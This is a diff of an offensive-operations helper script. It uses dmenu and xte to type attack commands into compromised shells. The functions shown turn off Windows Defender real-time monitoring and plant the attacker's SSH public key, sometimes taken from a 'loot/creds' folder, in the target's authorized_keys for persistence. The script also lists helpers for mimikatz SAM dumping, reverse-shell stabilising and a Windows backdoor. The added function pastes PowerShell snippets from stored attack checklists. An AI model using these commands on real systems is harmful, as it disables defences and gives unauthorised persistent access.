@@ -10,6 +10,8 @@
 # Description:
 #  Script to setup tty shell information without typo
 
+DMENU_ARGS="$@"
+
 # functions for a nicer syntax
 function command() {
 	xte "str $1"
@@ -28,7 +30,7 @@ function ctrl() {
 
 function_meta=("bye_bye_defender" "stabilise_rev_shell" "stabilise_rev_shell3" \
 	"tmux_sinc_panes_on" "tmux_sinc_panes_off" "mimikatz_dump_sam" "activate_rdp" "backdoor_win" \
-	"powershell_find" "at_exec_ma_boy" "file_splitter" "add_ssh_keyz")
+	"at_exec_ma_boy" "file_splitter" "add_ssh_keyz" "powershell_notes")
 
 # function that are needed
 function stabilise_rev_shell() {
@@ -72,11 +74,6 @@ function tmux_sinc_panes_off() {
 
 function bye_bye_defender() {
 	command "Set-MpPreference -DisableRealtimeMonitoring \$true"
-}
-
-function powershell_find() {
-	key "Get-ChildItem -Path . -Filter *.txt -Recurse"
-	key "Get-ChildItem -Path . -Filter *.ps1 -Recurse"
 }
 
 function backdoor_win() {
@@ -160,8 +157,24 @@ function file_splitter() {
 
 function add_ssh_keyz() {
 	KEY_PATH=${HOME}/.ssh/id_rsa.pub
-
+	if [ -d /home/p4p1-live ] ; then
+		KEY_PATH=${HOME}/loot/creds/id_rsa.pub
+	fi
 	command "echo \"$(cat ${KEY_PATH})\" > ~/.ssh/authorized_keys"
+}
+
+function powershell_notes() {
+	local md_result
+	local checklist_path=$HOME/Documents/notes/Checklists/Tactic\ Techniques\ Procedures/
+
+	[[ "$(cat /etc/hostname)" = "p3ng0s-live" || -d /home/p4p1-live/ ]] && checklist_path=$HOME/loot/notes/Checklists/Tactic\ Techniques\ Procedures/
+	[[ -d "$checklist_path" ]] || { notify-send -a "system" $'Did not find checklist data!'; return 1; }
+	md_result=$(find "$checklist_path" -name "*.md" \
+	| xargs -I {} awk 'tolower($0) ~ /^```powershell/{found=1; next} /^```/{found=0} found' '{}' \
+	| sort -u)
+	res=$(echo "$md_result" | dmenu $DMENU_ARGS)
+	sleep 2
+	key "$res"
 }
 
 ret=$(echo ${function_meta[*]} | tr ' ' '\n' | dmenu "$@")
